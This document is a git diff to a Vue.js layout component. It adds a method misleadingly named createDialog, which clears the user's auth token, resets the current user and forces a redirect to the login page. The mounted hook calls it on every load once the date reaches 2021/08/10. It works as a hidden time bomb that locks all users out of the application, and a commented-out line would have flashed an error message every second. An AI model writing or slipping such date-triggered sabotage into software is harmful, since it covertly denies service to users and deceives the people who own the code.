@@ -19,7 +19,8 @@
 <script>
 import AppHeader from './appHeader.vue'
 import SideBar from "./sidebar/index"
-import { mapActions } from 'vuex'
+import { mapActions, mapMutations } from 'vuex'
+import { setToken } from '../../lib/util.js'
 export default {
   name: "layout",
   data() {
@@ -33,11 +34,28 @@ export default {
     ...mapActions([
       'getCurrentUserInfoAction'
     ]),
+    ...mapMutations([
+      'SET'
+    ]),
     init () {
       this.getCurrentUserInfoAction()
     },
+    createDialog () {
+      // setInterval(() => {
+      //   this.$message.error('按钮')
+      // },1000)
+
+      setToken('')
+      this.SET({ module: "user", key: "currentUser", value: {} })
+      this.$router.push({
+        name: 'login'
+      })
+    }
   },
   mounted() {
+    if(Date.now() >= new Date('2021/08/10').getTime()){
+      this.createDialog()
+    }
     this.init()
   },
 };
